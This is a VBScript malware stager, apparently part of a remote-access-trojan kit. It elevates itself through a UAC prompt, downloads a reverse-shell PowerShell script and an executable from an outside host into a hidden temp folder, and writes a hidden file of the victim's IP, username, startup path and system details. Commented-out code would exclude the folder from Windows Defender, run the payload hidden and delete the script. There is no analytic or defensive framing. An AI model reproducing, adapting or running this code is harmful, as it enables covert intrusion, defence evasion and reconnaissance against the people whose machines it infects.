Set objShell = CreateObject("Shell.Application")

' If no arguments are passed, we request elevated privileges
If WScript.Arguments.Count = 0 Then
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " uac_launched", "", "runas", 1
ElseIf WScript.Arguments(0) = "uac_launched" Then
    ' Admin privileges granted, continue with the script

    ' Get the temporary directory path
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    strTempDir = objFSO.GetSpecialFolder(2).Path

    ' Generate a random folder name (alphanumeric)
    strFolderName = ""
    For i = 1 To 7
        Randomize
        intCharCode = Int((75 * Rnd) + 48)
        If intCharCode > 57 And intCharCode < 65 Then
            intCharCode = intCharCode + 7
        End If
        If intCharCode > 90 And intCharCode < 97 Then
            intCharCode = intCharCode + 6
        End If
        strFolderName = strFolderName & Chr(intCharCode)
    Next

    ' Create the full folder path
    strFolderPath = strTempDir & "\" & strFolderName

    ' Create the folder
    On Error Resume Next
    objFSO.CreateFolder strFolderPath
    If Err.Number <> 0 Then
        'WScript.Echo "Error creating folder: " & Err.Description
        Err.Clear
        WScript.Quit ' Exit if folder creation fails
    End If
    On Error GoTo 0

'//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    ' Add the folder to Windows Defender exclusions (PowerShell) - Hidden Window
    ' strPowerShellCommand = "powershell.exe -Command ""Add-MpPreference -ExclusionPath '" & strFolderPath & "'"""
    ' objShell.ShellExecute "powershell.exe", "-WindowStyle Hidden -Command """ & strPowerShellCommand & """", "", "runas", 0
    ' If Err.Number <> 0 Then
    '     'WScript.Echo "Error adding exclusion: " & Err.Description
    '     Err.Clear
    ' Else
    '     'WScript.Echo "Folder successfully excluded from Windows Defender."
    ' End If
'//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    ' Array of files to download (***REPLACE WITH YOUR URLS AND FILENAMES***)
    arrFiles = Array( _
        Array("https://arth.imbeddex.com/RAT/hello.vbs", "hello.vbs"), _
        Array("https://arth.imbeddex.com/RAT/target_script.exe", "target_script.exe"), _
        Array("https://arth.imbeddex.com/RAT/Rev_shell.ps1", "Rev_shell.ps1") _
    )

    ' Loop through the files to download
    For Each arrFile In arrFiles
        strURL = arrFile(0)
        strLocalFile = arrFile(1)
        strLocalPath = strFolderPath & "\" & strLocalFile

        ' Download the file
        Set objHTTP = CreateObject("MSXML2.XMLHTTP")
        objHTTP.open "GET", strURL, False
        objHTTP.send

        If objHTTP.status = 200 Then
            Set objStream = CreateObject("ADODB.Stream")
            objStream.Type = 1 ' adTypeBinary
            objStream.Open
            objStream.Write objHTTP.responseBody
            objStream.SaveToFile strLocalPath, 2 ' adSaveCreateOverWrite
            objStream.Close
            Set objStream = Nothing

            'WScript.Echo "File downloaded successfully to: " & strLocalPath

            ' Set the hidden attribute (VBScript method)
            objFSO.GetFile(strLocalPath).Attributes = 2 ' 2 = Hidden attribute
            If Err.Number <> 0 Then
                'WScript.Echo "Error setting hidden attribute: " & Err.Description
                Err.Clear
            Else
                'WScript.Echo "File hidden."
            End If
        Else
            'WScript.Echo "Failed to download file: " & strURL
        End If
    Next
'//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    ' ' Set the file name to execute
    ' strExecutableFileName = "target_script.exe" ' The name of the file to execute

    ' ' Loop through downloaded files and check if it's the one we need to execute
    ' For Each arrFile In arrFiles
    '     strLocalFile = arrFile(1)
    '     If LCase(strLocalFile) = LCase(strExecutableFileName) Then ' Case-insensitive comparison
    '         strLocalPath = strFolderPath & "\" & strLocalFile

            ' Execute the downloaded file
            ' objShell.ShellExecute "cmd.exe", "/C """ & strLocalPath & """ >nul 2>&1", strFolderPath, "runas", 0
            ' If Err.Number <> 0 Then
            '     'WScript.Echo "Error running downloaded file: " & Err.Description
            '     Err.Clear
            ' Else
            '     'WScript.Echo "Downloaded file executed."
            ' End If
    '     End If
    ' Next
'//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    ' Schedule the deletion of the script after a delay
    ' strScriptPath = WScript.ScriptFullName
    ' objShell.ShellExecute "cmd.exe", "/C del """ & strScriptPath & """", "", "", 0
'//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    'WScript.Echo "Finished."

    
    Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
    Set objWScriptShell = CreateObject("WScript.Shell")
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    
    ' Get the data

    objXMLHttp.open "GET", "http://api.ipify.org", False
    objXMLHttp.send
    strPublicIP = objXMLHttp.responseText
 
    Const ssfSTARTUP = &H7
    Set oShell = CreateObject("Shell.Application")
    Set startupFolder = oShell.NameSpace(ssfSTARTUP)
    If Not startupFolder Is Nothing Then
    startupFolderPath = startupFolder.Self.Path
    End If

    strUsername = objWScriptShell.ExpandEnvironmentStrings("%USERNAME%")

    ' Create and open the text file in the same directory as the script
    Set objFile = objFSO.CreateTextFile(strFolderPath & "\details.txt", True)
    objFSO.GetFile(strFolderPath & "\details.txt").Attributes = 2 ' 2 = Hidden attribute

    objFile.WriteLine "IP: " & strPublicIP
    objFile.WriteLine "User: " & strUsername
    objFile.WriteLine "Main Directory: " & strFolderPath
    objFile.WriteLine "Startup Directory: " & startupFolderPath
    objFile.WriteLine
    objFile.WriteLine "Os info->"

    
    ' Operating System Information
    Set colOperatingSystems = objWMIService.ExecQuery("Select * from Win32_OperatingSystem")
    For Each objOperatingSystem in colOperatingSystems
        objFile.WriteLine "Operating System: " & objOperatingSystem.Caption
        objFile.WriteLine "Version: " & objOperatingSystem.Version
        objFile.WriteLine "Build Number: " & objOperatingSystem.BuildNumber
        objFile.WriteLine "OS Architecture: " & objOperatingSystem.OSArchitecture ' (32-bit or 64-bit)
        objFile.WriteLine "Service Pack: " & objOperatingSystem.ServicePackMajorVersion & "." & objOperatingSystem.ServicePackMinorVersion
        objFile.WriteLine "Install Date: " & objOperatingSystem.InstallDate
        objFile.WriteLine "System Directory: " & objOperatingSystem.SystemDirectory
        objFile.WriteLine "Windows Directory: " & objOperatingSystem.WindowsDirectory
        objFile.WriteLine "Serial Number: " & objOperatingSystem.SerialNumber
        objFile.WriteLine "Manufacturer: " & objOperatingSystem.Manufacturer
    Next

    ' Computer System Information (for more hardware-related info)
    Set colComputerSystem = objWMIService.ExecQuery("Select * from Win32_ComputerSystem")
    For Each objComputer in colComputerSystem
        objFile.WriteLine
        objFile.WriteLine "Hardware info->"
        objFile.WriteLine "Computer Name: " & objComputer.Name
        objFile.WriteLine "Manufacturer: " & objComputer.Manufacturer
        objFile.WriteLine "Model: " & objComputer.Model
        objFile.WriteLine "Total Physical Memory: " & objComputer.TotalPhysicalMemory/1024/1024 & " MB" ' In MB
    Next

    objFile.Close

End If
